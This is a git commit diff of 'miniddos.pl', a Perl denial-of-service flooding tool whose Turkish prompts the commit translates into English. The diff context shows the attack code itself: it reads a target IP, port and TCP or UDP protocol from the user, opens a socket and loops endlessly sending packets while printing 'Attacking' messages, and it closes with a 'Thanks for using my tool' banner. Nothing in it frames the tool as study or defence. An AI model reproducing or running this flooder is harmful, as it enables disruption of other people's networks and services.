d67d567563a013ee6e806ff29c0489caf5263e14
SyberCodeV1 <65829832+sybercodev1real@users.noreply.github.com>
2020-11-13 18:54:41 +0300

    Update miniddos.pl

--- miniddos.pl
+++ miniddos.pl
@@ -18,7 +18,7 @@ print q{         __  __ _       _ ____  ____       ____
         |_|  |_|_|_| |_|_|____/|____/ \___/____/
            Coder: SyberCodeV1 & GrayTurkish
 };
-# İnternet Bağlantısını Kontrol Et!!
+
 my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
 	'PeerPort'=>80, 
 	'Timeout'=>2, 
@@ -31,31 +31,31 @@ if(!(defined $check && $check)){
 $check->close();
 # INPUT TARGET INFO ==============================================
 print "\n===============================";
-print "\n[~] İp adresi: "; # Set Target IP
+print "\n[~] İp adress: "; # Set Target IP
 $host = <STDIN>;
 chomp ($host);
 while ($host eq ""){
- print "   [!] İp adresi yanlıs tekrar girin?: ";
+ print "   [!] Re-enter IP address incorrectly: ";
  $host = <STDIN>;
  chomp ($host);
 }
 print "TRAGET ==> $host";
 print "\n===============================";
-print "\n[~] Port: "; # Set Port
+print "\n[~] Enter the port address: "; # Set Port
 $port = <STDIN>;
 chomp ($port);
 while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
- print "   [!] Port adresini tekrar girin?: ";       
+ print "   [!] Re-enter the port address: ";       
  $port = <STDIN>;
  chomp ($port); 
 } 
 print "PORT ==> $port";
 print "\n===============================";
-print "\n[~] Protokol? (TCP - UDP) :"; # Set Protockol;
+print "\n[~] Protocol? (TCP - UDP) :"; # Set Protockol;
 $proto = <STDIN>;
 chomp ($proto);
 while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
- print "   [!] Protokolu tekrar girin(TCP - UDP) ?: ";
+ print "   [!] you wrote wrong please try again(TCP - UDP) ?: ";
  $proto = <STDIN>;
  chomp ($proto);
 }
@@ -68,17 +68,17 @@ $sock = IO::Socket::INET->new(
         PeerPort => $port,
         Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
 system("clear || cls");
-print "\n[*] Saldırı başladı![$host:$port] proto => [$proto].......\n\n";
+print "\n[*] Attack started! [$host:$port] proto => [$proto].......\n\n";
 sleep(1);
 while (1) {
   if(grep{$proto eq $_} 'TCP','tcp'){
        $sock = IO::Socket::INET->new(
         PeerAddr => $host,
         PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Bağlantı başarısız hedef[$host] port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
+        Proto => "$proto" ) || die "\n[!] Connection Failed [$host] port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
         for($i=0; $i<=500; $i++){
             $size = rand() * 8921873 * 99919988;
-            print ("Saldırılıyor: (=>$host:$port~$proto<=) Packet yollandı: $size\n");
+            print ("Attacking: (=>$host:$port~$proto<=) Packet sent: $size\n");
             send($sock, $size*2, $size*2); 
             send($sock, $size*3, $size*3);
             send($sock, $size*4, $size*4);
@@ -88,7 +88,7 @@ while (1) {
 
   }else{
             $size = rand() * 8921873 * 99919988;
-            print ("Saldırılıyor: (=>$host:$port~$proto<=) Packet yollandı: $size\n");
+            print ("Attacking: (=>$host:$port~$proto<=) Packet sent: $size\n");
             send($sock, $size*2, $size*2); 
             send($sock, $size*3, $size*3);
             send($sock, $size*4, $size*4);
@@ -99,7 +99,7 @@ while (1) {
 $sock->close()
 ##############################################################################
 #####################                                #########################
-##################### Kullandıgınız için teşekkürler #########################
+#####################   Thanks for using my tool     #########################
 #####################                                #########################
 ##############################################################################
 
